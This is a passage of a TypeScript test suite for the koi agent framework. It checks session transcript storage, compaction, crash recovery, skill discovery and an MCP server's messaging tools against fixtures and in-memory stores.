    const doc = (await Bun.file(`${FIXTURES}/session-persist.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly extra?: {
          readonly type?: string;
          readonly middlewareName?: string;
          readonly hook?: string;
          readonly outcome?: string;
        };
      }[];
    };
    const sessionSpans = doc.steps.filter(
      (s) =>
        s.extra?.type === "middleware_span" &&
        s.extra?.middlewareName === "@koi/session:transcript",
    );
    // Must have at least one MW:@koi/session:transcript span
    expect(sessionSpans.length).toBeGreaterThanOrEqual(1);
    // Span must have fired wrapModelStream
    expect(sessionSpans[0]?.extra?.hook).toBe("wrapModelStream");
  });

  test("trajectory has model step (agent completed the turn)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/session-persist.trajectory.json`).json()) as {
      readonly steps: readonly { readonly source: string }[];
    };
    const modelSteps = doc.steps.filter((s) => s.source === "agent");
    expect(modelSteps.length).toBeGreaterThanOrEqual(1);
  });
});

describe("Golden: @koi/session — session-transcript-compaction", () => {
  test("compact(preserveLastN=3) produces correct summary + tail with no corruption", async () => {
    const { mkdtemp, rm } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const { createJsonlTranscript } = await import("@koi/session");
    const { sessionId } = await import("@koi/core");

    const tmpDir = await mkdtemp(join(tmpdir(), "koi-golden-session-"));
    try {
      const store = createJsonlTranscript({ baseDir: tmpDir });
      const sid = sessionId("golden-compact");

      const entries = Array.from({ length: 10 }, (_, i) => ({
        id: `entry-${i}` as ReturnType<typeof import("@koi/core").transcriptEntryId>,
        role: "user" as const,
        content: `turn-${i}`,
        timestamp: 1000 * (i + 1),
      }));
      await store.append(sid, entries);

      const compactResult = await store.compact(sid, "Summary of turns 0-6", 3);
      expect(compactResult.ok).toBe(true);

      const result = await store.load(sid);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.value.entries.length).toBe(4);
        expect(result.value.skipped.length).toBe(0);
        const [summary, ...tail] = result.value.entries;
        expect(summary?.role).toBe("compaction");
        expect(summary?.content).toBe("Summary of turns 0-6");
        expect(tail[0]?.content).toBe("turn-7");
        expect(tail[2]?.content).toBe("turn-9");
      }
    } finally {
      await rm(tmpDir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// Phase 2e-2: session-resume trajectory (crash recovery end-to-end)
// ---------------------------------------------------------------------------

describe("Golden: @koi/session — session-resume trajectory", () => {
  type Step = {
    readonly source: string;
    readonly tool_calls?: readonly {
      readonly function_name: string;
      readonly arguments?: Record<string, unknown>;
    }[];
    readonly observation?: {
      readonly results?: readonly { readonly content: string }[];
    };
    readonly extra?: {
      readonly type?: string;
      readonly middlewareName?: string;
      readonly hook?: string;
    };
  };

  const loadTrajectory = async (): Promise<readonly Step[]> => {
    const doc = (await Bun.file(`${FIXTURES}/session-resume.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly steps: readonly Step[];
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    return doc.steps;
  };

  test("trajectory has add_numbers tool call with a=15, b=25 (new turn after resume)", async () => {
    const steps = await loadTrajectory();
    const toolStep = steps.find(
      (s) => s.source === "tool" && s.tool_calls?.some((tc) => tc.function_name === "add_numbers"),
    );
    expect(toolStep).toBeDefined();
    const tc = toolStep?.tool_calls?.find((c) => c.function_name === "add_numbers");
    expect(tc?.arguments?.a).toBe(15);
    expect(tc?.arguments?.b).toBe(25);
  });

  test("trajectory has @koi/session:transcript wrapToolCall span (transcript captured new tool call)", async () => {
    const steps = await loadTrajectory();
    const transcriptSpans = steps.filter(
      (s) =>
        s.extra?.type === "middleware_span" &&
        s.extra?.middlewareName === "@koi/session:transcript",
    );
    expect(transcriptSpans.length).toBeGreaterThanOrEqual(1);
    const toolCallSpan = transcriptSpans.find((s) => s.extra?.hook === "wrapToolCall");
    expect(toolCallSpan).toBeDefined();
  });

  test("trajectory final agent step reports both prior result (10) and new result (40)", async () => {
    const steps = await loadTrajectory();
    // Last agent step should contain the model's summary mentioning both results
    const agentSteps = steps.filter((s) => s.source === "agent");
    expect(agentSteps.length).toBeGreaterThanOrEqual(2);
    const lastAgentStep = agentSteps.at(-1);
    const lastContent = lastAgentStep?.observation?.results?.[0]?.content ?? "";
    // Model should mention 10 (prior 3+7) and 40 (new 15+25)
    expect(lastContent).toContain("10");
    expect(lastContent).toContain("40");
  });
});

// ---------------------------------------------------------------------------
// Phase 2e-2: resumeFromTranscript (crash recovery + resume)
// ---------------------------------------------------------------------------

describe("Golden: @koi/session — resume-from-transcript", () => {
  test("tool_call/tool_result pairs are positionally matched and produce InboundMessages", async () => {
    const { resumeFromTranscript } = await import("@koi/session");
    const { transcriptEntryId } = await import("@koi/core");

    const entries = [
      {
        id: transcriptEntryId("e1"),
        role: "user" as const,
        content: "Run the tool",
        timestamp: 1000,
      },
      {
        id: transcriptEntryId("e2"),
        role: "tool_call" as const,
        content: JSON.stringify([{ id: "call-abc", toolName: "Glob", args: "{}" }]),
        timestamp: 2000,
      },
      {
        id: transcriptEntryId("e3"),
        role: "tool_result" as const,
        content: "src/index.ts",
        timestamp: 3000,
      },
    ];

    const result = resumeFromTranscript(entries);
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const { messages } = result.value;
    // user message
    expect(messages[0]?.senderId).toBe("user");
    expect((messages[0]?.content[0] as { kind: string; text: string }).text).toBe("Run the tool");
    // tool_call → assistant message with toolCalls array (request-mapper primary path).
    // One assistant message per transcript tool_call entry (not one per call) so
    // fixTranscriptOrdering sees a single tool_calls turn and preserves all results.
    const toolCallMsg = messages.find(
      (m) =>
        m.senderId === "assistant" &&
        Array.isArray((m.metadata as Record<string, unknown>)?.toolCalls),
    );
    expect(toolCallMsg).toBeDefined();
    const toolCalls = (toolCallMsg?.metadata as Record<string, unknown>)?.toolCalls as
      | Array<{ id: string; function: { name: string } }>
      | undefined;
    expect(toolCalls?.[0]?.id).toBe("call-abc");
    expect(toolCalls?.[0]?.function?.name).toBe("Glob");
    // tool_result → tool message with matched callId
    const toolResultMsg = messages.find(
      (m) =>
        m.senderId === "tool" && (m.metadata as Record<string, unknown>)?.callId === "call-abc",
    );
    expect(toolResultMsg).toBeDefined();
    expect((toolResultMsg?.content[0] as { kind: string; text: string }).text).toBe("src/index.ts");
  });

  test("dangling tool_call (crash before result) gets synthetic error result", async () => {
    const { resumeFromTranscript } = await import("@koi/session");
    const { transcriptEntryId } = await import("@koi/core");

    const entries = [
      {
        id: transcriptEntryId("e1"),
        role: "tool_call" as const,
        content: JSON.stringify([{ id: "call-dangling", toolName: "Read", args: "{}" }]),
        timestamp: 1000,
      },
      // No tool_result — simulates crash before tool completed
    ];

    const result = resumeFromTranscript(entries);
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const { messages } = result.value;
    // Should have a synthetic error tool result for the dangling call
    const syntheticResult = messages.find(
      (m) =>
        m.senderId === "tool" &&
        (m.metadata as Record<string, unknown>)?.callId === "call-dangling" &&
        (m.metadata as Record<string, unknown>)?.synthetic === true &&
        (m.metadata as Record<string, unknown>)?.isError === true,
    );
    expect(syntheticResult).toBeDefined();
    expect((syntheticResult?.content[0] as { kind: string; text: string }).text).toContain(
      "crashed",
    );
  });

  test("compaction entry is folded into a synthetic user message with [Summary] prefix", async () => {
    const { resumeFromTranscript } = await import("@koi/session");
    const { transcriptEntryId } = await import("@koi/core");

    const entries = [
      {
        id: transcriptEntryId("e1"),
        role: "compaction" as const,
        content: "First 5 turns summarized",
        timestamp: 500,
      },
      {
        id: transcriptEntryId("e2"),
        role: "user" as const,
        content: "Continue",
        timestamp: 1000,
      },
    ];

    const result = resumeFromTranscript(entries);
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const { messages } = result.value;
    const compactionMsg = messages[0];
    expect(compactionMsg?.senderId).toBe("user");
    expect((compactionMsg?.content[0] as { kind: string; text: string }).text).toBe(
      "[Summary] First 5 turns summarized",
    );
    expect((compactionMsg?.metadata as Record<string, unknown>)?.synthetic).toBe(true);
    expect((compactionMsg?.metadata as Record<string, unknown>)?.compacted).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Phase 2e-2: compact() boundary extension (extended=true path)
// ---------------------------------------------------------------------------

describe("Golden: @koi/session — compact-boundary-extension", () => {
  test("compact() extends boundary backward when naive cut lands on tool_result", async () => {
    const { createInMemoryTranscript } = await import("@koi/session");
    const { transcriptEntryId, sessionId } = await import("@koi/core");

    const store = createInMemoryTranscript();
    const sid = sessionId("golden-boundary");

    // 6 entries: user, tool_call, tool_result, user, tool_call, tool_result
    // naive cut at preserveLastN=3 → index 3 → "user" → no extension
    // but with preserveLastN=2 → index 4 → tool_call → scan back? No, tool_call is ok
    // To trigger extension: preserveLastN=2 → index 4 → tool_result at index 4? No
    // Layout: [0:user, 1:tool_call, 2:tool_result, 3:user, 4:tool_call, 5:tool_result]
    // preserveLastN=1 → naiveCutIndex=5 → entries[5].role=tool_result → extend back to 4
    const entries = [
      { id: transcriptEntryId("e0"), role: "user" as const, content: "hi", timestamp: 100 },
      {
        id: transcriptEntryId("e1"),
        role: "tool_call" as const,
        content: JSON.stringify([{ id: "c1", toolName: "Glob", args: "{}" }]),
        timestamp: 200,
      },
      { id: transcriptEntryId("e2"), role: "tool_result" as const, content: "ok", timestamp: 300 },
      { id: transcriptEntryId("e3"), role: "user" as const, content: "next", timestamp: 400 },
      {
        id: transcriptEntryId("e4"),
        role: "tool_call" as const,
        content: JSON.stringify([{ id: "c2", toolName: "Read", args: "{}" }]),
        timestamp: 500,
      },
      {
        id: transcriptEntryId("e5"),
        role: "tool_result" as const,
        content: "content",
        timestamp: 600,
      },
    ];
    await store.append(sid, entries);

    // preserveLastN=1 → naive cut at index 5 (tool_result) → should extend to index 4
    const result = await store.compact(sid, "Summary", 1);
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    // extended=true: boundary was moved back
    expect(result.value.extended).toBe(true);
    // preserved includes both tool_call(e4) and tool_result(e5)
    expect(result.value.preserved).toBe(2);

    // After compaction: [compaction, tool_call(e4), tool_result(e5)]
    const loadResult = await store.load(sid);
    expect(loadResult.ok).toBe(true);
    if (!loadResult.ok) return;

    expect(loadResult.value.entries.length).toBe(3);
    expect(loadResult.value.entries[0]?.role).toBe("compaction");
    expect(loadResult.value.entries[1]?.role).toBe("tool_call");
    expect(loadResult.value.entries[2]?.role).toBe("tool_result");
  });

  test("compact() does NOT set extended=true when cut lands on non-tool_result", async () => {
    const { createInMemoryTranscript } = await import("@koi/session");
    const { transcriptEntryId, sessionId } = await import("@koi/core");

    const store = createInMemoryTranscript();
    const sid = sessionId("golden-no-extension");

    const entries = [
      { id: transcriptEntryId("e0"), role: "user" as const, content: "a", timestamp: 100 },
      { id: transcriptEntryId("e1"), role: "assistant" as const, content: "b", timestamp: 200 },
      { id: transcriptEntryId("e2"), role: "user" as const, content: "c", timestamp: 300 },
    ];
    await store.append(sid, entries);

    // preserveLastN=1 → cut at index 2 → role="user" → no extension
    const result = await store.compact(sid, "Summary", 1);
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.value.extended).toBe(false);
    expect(result.value.preserved).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Phase 2e-2: setSessionStatus + saveContentReplacement
// ---------------------------------------------------------------------------

describe("Golden: @koi/session — session-status-content-replacement", () => {
  test("setSessionStatus transitions idle → running → done and recover() surfaces status", async () => {
    const { createSqliteSessionPersistence } = await import("@koi/session");
    const { agentId, sessionId } = await import("@koi/core");

    const store = createSqliteSessionPersistence({ dbPath: ":memory:" });
    const sid = sessionId("golden-status");
    const now = Date.now();

    store.saveSession({
      sessionId: sid,
      agentId: agentId("agent-x"),
      manifestSnapshot: { name: "x", version: "1.0.0", model: { name: "gpt" } },
      seq: 1,
      remoteSeq: 0,
      connectedAt: now,
      lastPersistedAt: now,
      status: "idle",
      metadata: {},
    });

    // Transition to running
    const r1 = await store.setSessionStatus(sid, "running");
    expect(r1.ok).toBe(true);

    const loaded = await store.loadSession(sid);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) expect(loaded.value.status).toBe("running");

    // Transition to done
    const r2 = await store.setSessionStatus(sid, "done");
    expect(r2.ok).toBe(true);

    const loaded2 = await store.loadSession(sid);
    expect(loaded2.ok).toBe(true);
    if (loaded2.ok) expect(loaded2.value.status).toBe("done");

    store.close();
  });

  test("saveContentReplacement + loadContentReplacements round-trips correctly", async () => {
    const { createSqliteSessionPersistence } = await import("@koi/session");
    const { agentId, sessionId } = await import("@koi/core");

    const store = createSqliteSessionPersistence({ dbPath: ":memory:" });
    const sid = sessionId("golden-content-replace");
    const now = Date.now();

    store.saveSession({
      sessionId: sid,
      agentId: agentId("agent-y"),
      manifestSnapshot: { name: "y", version: "1.0.0", model: { name: "gpt" } },
      seq: 1,
      remoteSeq: 0,
      connectedAt: now,
      lastPersistedAt: now,
      status: "idle",
      metadata: {},
    });

    const r = await store.saveContentReplacement({
      sessionId: sid,
      messageId: "msg-001",
      filePath: "/tmp/context-dump.txt",
      byteCount: 4096,
      replacedAt: now,
    });
    expect(r.ok).toBe(true);

    const loaded = await store.loadContentReplacements(sid);
    expect(loaded.ok).toBe(true);
    if (!loaded.ok) return;

    expect(loaded.value.length).toBe(1);
    expect(loaded.value[0]?.messageId).toBe("msg-001");
    expect(loaded.value[0]?.filePath).toBe("/tmp/context-dump.txt");
    expect(loaded.value[0]?.byteCount).toBe(4096);

    store.close();
  });
});

// ---------------------------------------------------------------------------
// Golden: @koi/skills-runtime — skill-load cassette → createKoi → live ATIF
// Proves createSkillProvider wires into createKoi correctly:
//   skill discovered from disk → SkillComponent attached under skillToken →
//   agent loop runs cleanly → model call step in ATIF
// ---------------------------------------------------------------------------

describe("Golden: @koi/skills-runtime (skill-load cassette replay)", () => {
  test("createSkillProvider wires into createKoi, skill attaches, agent runs", async () => {
    const cassette = await loadCassette(`${FIXTURES}/skill-load.cassette.json`);
    const trajDir = `/tmp/koi-skills-replay-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-skill-load";

    // Create a temp skill dir so the runtime can discover real SKILL.md files.
    const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const skillsDir = mkdtempSync(join(tmpdir(), "koi-replay-skills-"));
    mkdirSync(join(skillsDir, "bullet-points"), { recursive: true });
    writeFileSync(
      join(skillsDir, "bullet-points", "SKILL.md"),
      [
        "---",
        "name: bullet-points",
        "description: Respond using bullet points instead of prose.",
        "---",
        "",
        "Always respond using bullet point lists. Never use prose paragraphs.",
      ].join("\n"),
    );
    // Clean up temp skill dir after test (reuse trajDirs cleanup mechanism)
    trajDirs.push(skillsDir);

    const store = createAtifDocumentStore(
      { agentName: "skills-replay-test" },
      createFsAtifDelegate(trajDir),
    );

    const { middleware: eventTrace } = createEventTraceMiddleware({
      store,
      docId,
      agentName: "skills-replay-test",
    });

    const permBackend = createPermissionBackend({
      mode: "bypass",
      rules: [{ pattern: "*", action: "*", effect: "allow", source: "policy" }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "bypass (allow all)",
    });

    // @koi/skills-runtime — the package under test
    const skillRuntime = createSkillsRuntime({ bundledRoot: null, userRoot: skillsDir });
    const provider = createSkillProvider(skillRuntime);

    // Simple text adapter (skills attach at ECS level, no tool calls needed)
    // let: mutable call counter
    let callCount = 0;
    const skillAdapter: EngineAdapter = {
      engineId: "skills-cassette-replay",
      capabilities: { text: true, images: false, files: false, audio: false },
      terminals: {
        modelCall: async (): Promise<ModelResponse> => ({ content: "fallback", model: MODEL }),
        modelStream: (): AsyncIterable<ModelChunk> => {
          const currentCall = callCount;
          callCount++;
          if (currentCall === 0) return toAsyncIterable(cassette.chunks);
          return toAsyncIterable([
            { kind: "text_delta" as const, delta: "Red, blue, yellow." },
            {
              kind: "done" as const,
              response: { content: "Red, blue, yellow.", model: MODEL },
            },
          ]);
        },
        toolCall: async (_r: ToolRequest): Promise<ToolResponse> => ({ output: "unused" }),
      },
      stream(input: EngineInput): AsyncIterable<EngineEvent> {
        const h = input.callHandlers;
        if (!h) {
          return (async function* () {
            yield {
              kind: "done" as const,
              output: {
                content: [],
                stopReason: "error" as const,
                metrics: {
                  totalTokens: 0,
                  inputTokens: 0,
                  outputTokens: 0,
                  turns: 0,
                  durationMs: 0,
                },
              },
            };
          })();
        }
        const text = input.kind === "text" ? input.text : "";
        const messages: InboundMessage[] = [
          { senderId: "user", timestamp: Date.now(), content: [{ kind: "text", text }] },
        ];
        return (async function* () {
          // let: mutable
          let done: EngineEvent | undefined;
          for await (const e of consumeModelStream(
            h.modelStream
              ? h.modelStream({ messages, model: MODEL })
              : (async function* (): AsyncIterable<ModelChunk> {
                  const r = await h.modelCall({ messages, model: MODEL });
                  yield { kind: "done" as const, response: { content: r.content, model: MODEL } };
                })(),
            input.signal,
          )) {
            if (e.kind === "done") done = e;
            else yield e;
          }
          if (done) yield done;
        })();
      },
    };

    const koiRuntime = await createKoi({
      manifest: { name: "skills-replay-test", version: "0.1.0", model: { name: MODEL } },
      adapter: skillAdapter,
      middleware: [eventTrace, permHandle].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId }),
      ),
      providers: [provider],
      loopDetection: false,
    });

    for await (const _e of koiRuntime.run({
      kind: "text",
      text: "What are the primary colors? Answer briefly.",
    })) {
      /* drain */
    }

    await koiRuntime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    // Validate live ATIF
    const steps = await store.getDocument(docId);

    // Agent ran: at least one model call step
    const modelSteps = steps.filter(
      (s) => s.kind === "model_call" && !s.identifier.startsWith("middleware:"),
    );
    expect(modelSteps.length).toBeGreaterThanOrEqual(1);
    expect(modelSteps[0]?.outcome).toBe("success");

    // Middleware spans: permissions wired correctly alongside skill provider
    const mwSpans = steps.filter((s) => s.metadata?.type === "middleware_span");
    const mwNames = new Set(mwSpans.map((s) => s.metadata?.middlewareName));
    expect(mwNames.has("permissions")).toBe(true);
  }, 15000);
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/mcp-server (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/mcp-server", () => {
  test("createMcpServer exposes platform tools when capabilities provided", async () => {
    const { createMcpServer, createPlatformTools } = await import("@koi/mcp-server");
    const { agentId } = await import("@koi/core");
    const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");
    const { Client } = await import("@modelcontextprotocol/sdk/client/index.js");

    const callerId = agentId("golden-caller");

    // Minimal mock mailbox
    const mockMailbox = {
      send: async (input: unknown) => ({
        ok: true as const,
        value: {
          ...(input as Record<string, unknown>),
          id: "msg-1",
          createdAt: new Date().toISOString(),
        },
      }),
      onMessage: () => () => {},
      list: async () => [],
    };

    // Minimal mock agent (no tools)
    const mockAgent = {
      manifest: { name: "golden-agent", version: "0.0.0", description: "test" },
      component: () => undefined,
      has: () => false,
      hasAll: () => false,
      query: () => new Map(),
      components: () => new Map(),
    };

    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    const server = createMcpServer({
      agent: mockAgent as never,
      transport: serverTransport,
      platform: {
        callerId,
        mailbox: mockMailbox as never,
      },
    });

    const client = new Client({ name: "golden-client", version: "1.0.0" });
    await server.start();
    await client.connect(clientTransport);

    // Verify tools/list returns platform tools
    const tools = await client.listTools();
    expect(tools.tools.length).toBe(2); // koi_send_message + koi_list_messages
    const names = tools.tools.map((t) => t.name);
    expect(names).toContain("koi_send_message");
    expect(names).toContain("koi_list_messages");

    // Verify tool schemas have required fields
    const sendTool = tools.tools.find((t) => t.name === "koi_send_message");
    expect(sendTool?.description).toContain("event message");
    expect(sendTool?.inputSchema).toBeDefined();

    await server.stop();
  });

  test("koi_send_message enforces callerId as from and kind as event via MCP", async () => {
    const { createMcpServer } = await import("@koi/mcp-server");
    const { agentId } = await import("@koi/core");
    const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");
    const { Client } = await import("@modelcontextprotocol/sdk/client/index.js");

    const callerId = agentId("golden-caller");
    const sentMessages: unknown[] = [];

    const mockMailbox = {
      send: async (input: unknown) => {
        sentMessages.push(input);
        return {
          ok: true as const,
          value: {
            ...(input as Record<string, unknown>),
            id: "msg-1",
            createdAt: new Date().toISOString(),
          },
        };
      },
      onMessage: () => () => {},
      list: async () => [],
    };

    const mockAgent = {
      manifest: { name: "golden-agent", version: "0.0.0", description: "test" },
      component: () => undefined,
      has: () => false,
      hasAll: () => false,
      query: () => new Map(),
      components: () => new Map(),
    };

    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
    const server = createMcpServer({
      agent: mockAgent as never,
      transport: serverTransport,
      platform: { callerId, mailbox: mockMailbox as never },
    });

    const client = new Client({ name: "golden-client", version: "1.0.0" });
    await server.start();
    await client.connect(clientTransport);

    // Call koi_send_message
    await client.callTool({
      name: "koi_send_message",
      arguments: { to: "target-agent", type: "test-msg", payload: { data: 42 } },
    });

    // Verify security invariants
    expect(sentMessages).toHaveLength(1);
    const sent = sentMessages[0] as Record<string, unknown>;
    expect(sent.from).toBe(callerId); // callerId enforced
    expect(sent.kind).toBe("event"); // event-only enforced

    await server.stop();
  });

  test("mcp-server-send trajectory has correct ATIF structure and tool call", async () => {
    const traj = await Bun.file(
      `${import.meta.dirname}/../../fixtures/mcp-server-send.trajectory.json`,
    ).json();

    // ATIF v1.6 structure
    expect(traj.schema_version).toBe("ATIF-v1.6");
    expect(traj.steps.length).toBeGreaterThan(0);

    // All steps have valid sources
    const validSources = new Set([
      "system",
      "agent",
      "tool",
      "middleware",
      "hook",
      "mcp",
      "lifecycle",
    ]);
    for (const step of traj.steps) {
      expect(validSources.has(step.source)).toBe(true);
    }

    // All steps succeeded
    for (const step of traj.steps) {
      expect(step.outcome).toBe("success");
    }

    // Tool call step exists with correct tool name
    const toolStep = traj.steps.find(
      (s: { source: string; tool_calls?: readonly { function_name: string }[] }) =>
        s.source === "tool" &&
        s.tool_calls?.some((tc) => tc.function_name.includes("koi_send_message")),
    );
    expect(toolStep).toBeDefined();
    expect(toolStep.tool_calls[0].function_name).toBe("koi-platform__koi_send_message");

    // Tool result contains a message ID (successful send)
    const resultContent = toolStep.observation?.results?.[0]?.content ?? "";
    expect(String(resultContent)).toContain("msg-");
  });
});

// ---------------------------------------------------------------------------
// Golden: @koi/skills-runtime — standalone progressive loading + registry
// No LLM needed. Exercises discover(), query(), invalidate() directly.
// ---------------------------------------------------------------------------

describe("Golden: @koi/skills-runtime (standalone progressive loading)", () => {
  test("discover() returns SkillMetadata with description and tags — no body loaded", async () => {
    const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const skillsDir = mkdtempSync(join(tmpdir(), "koi-golden-progressive-"));
    trajDirs.push(skillsDir);

    mkdirSync(join(skillsDir, "refactor-skill"), { recursive: true });
    writeFileSync(
      join(skillsDir, "refactor-skill", "SKILL.md"),
      [
        "---",
        "name: refactor-skill",
        "description: Helps refactor code.",
        "tags:",
        "  - refactor",
        "  - typescript",
        "allowed-tools: read_file write_file",
        "---",
        "",
        "# Refactor Skill",
        "",
        "This is the skill body with detailed instructions.",
      ].join("\n"),
    );

    const runtime = createSkillsRuntime({ bundledRoot: null, userRoot: skillsDir });
    const result = await runtime.discover();

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    // discover() returns SkillMetadata — frontmatter fields available
    const meta = result.value.get("refactor-skill");
    expect(meta).toBeDefined();
    expect(meta?.name).toBe("refactor-skill");
    expect(meta?.description).toBe("Helps refactor code.");
    expect(meta?.tags).toEqual(["refactor", "typescript"]);
    expect(meta?.allowedTools).toEqual(["read_file", "write_file"]);
    expect(meta?.source).toBe("user");

    // SkillMetadata has no 'body' field — body is only on SkillDefinition
    expect(Object.keys(meta ?? {})).not.toContain("body");
  });

  test("query() filters by tags (AND semantics) and source without loading bodies", async () => {
    const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const userDir = mkdtempSync(join(tmpdir(), "koi-golden-query-user-"));
    const projectDir = mkdtempSync(join(tmpdir(), "koi-golden-query-project-"));
    trajDirs.push(userDir, projectDir);

    // user: skill with both tags
    mkdirSync(join(userDir, "ts-refactor"), { recursive: true });
    writeFileSync(
      join(userDir, "ts-refactor", "SKILL.md"),
      "---\nname: ts-refactor\ndescription: TS refactor.\ntags:\n  - refactor\n  - typescript\n---\n\nBody.",
    );

    // user: skill with one tag
    mkdirSync(join(userDir, "generic-refactor"), { recursive: true });
    writeFileSync(
      join(userDir, "generic-refactor", "SKILL.md"),
      "---\nname: generic-refactor\ndescription: Generic refactor.\ntags:\n  - refactor\n---\n\nBody.",
    );

    // project: skill with both tags (different source)
    mkdirSync(join(projectDir, "project-ts"), { recursive: true });
    writeFileSync(
      join(projectDir, "project-ts", "SKILL.md"),
      "---\nname: project-ts\ndescription: Project TS.\ntags:\n  - refactor\n  - typescript\n---\n\nBody.",
    );

    const runtime = createSkillsRuntime({
      bundledRoot: null,
      userRoot: userDir,
      projectRoot: projectDir,
    });

    // AND semantics: both tags required → excludes generic-refactor
    const bothTags = await runtime.query({ tags: ["refactor", "typescript"] });
    expect(bothTags.ok).toBe(true);
    if (!bothTags.ok) return;
    expect(bothTags.value).toHaveLength(2);
    const names = bothTags.value.map((m) => m.name);
    expect(names).toContain("ts-refactor");
    expect(names).toContain("project-ts");
    expect(names).not.toContain("generic-refactor");

    // Source filter: user only + both tags → just ts-refactor
    const userOnly = await runtime.query({ source: "user", tags: ["refactor", "typescript"] });
    expect(userOnly.ok).toBe(true);
    if (!userOnly.ok) return;
    expect(userOnly.value).toHaveLength(1);
    expect(userOnly.value[0]?.name).toBe("ts-refactor");

    // invalidate() preserves metadata but clears body cache
    runtime.invalidate("ts-refactor");
    const afterInvalidate = await runtime.query({ tags: ["typescript"] });
    expect(afterInvalidate.ok).toBe(true);
    if (!afterInvalidate.ok) return;
    expect(afterInvalidate.value).toHaveLength(2); // metadata still available
  });
});
